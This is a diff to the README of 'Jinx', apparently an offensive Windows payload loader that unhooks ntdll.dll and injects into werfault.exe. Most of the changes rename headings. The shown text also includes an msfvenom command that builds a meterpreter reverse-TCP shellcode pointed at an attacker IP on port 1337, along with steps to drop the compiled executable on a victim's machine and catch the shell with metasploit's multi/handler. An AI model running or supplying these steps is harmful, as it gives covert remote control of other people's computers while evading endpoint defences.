@@ -8,9 +8,10 @@
 - DLL Unhooking - full unhook of ntdll.dll
 - Process Injection - injecting the payload to werfault.exe
 
-## Installation and use
-Jinx requires [Python3](https://www.python.org/) and C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/))
+## Requirements
+Jinx requires [Python3](https://www.python.org/) and a C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/))
 
+## Usage
 In this demonstration we will generate a shellcode using msfvenom in our kali machine:
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -f raw -o shellcode
@@ -32,7 +33,7 @@ Build The project and drop the executable on the victim's machine.
 
 On the attacker's machine use metasploit's multi/handler on port 1337 and on the victim's machine execute Jinx.
 
-## Credits
+## Authors and acknowledgment
 [RonKon](https://github.com/RonKonis) - Development
 <br>
 [dkonis](https://github.com/dkonis) - Research & Development
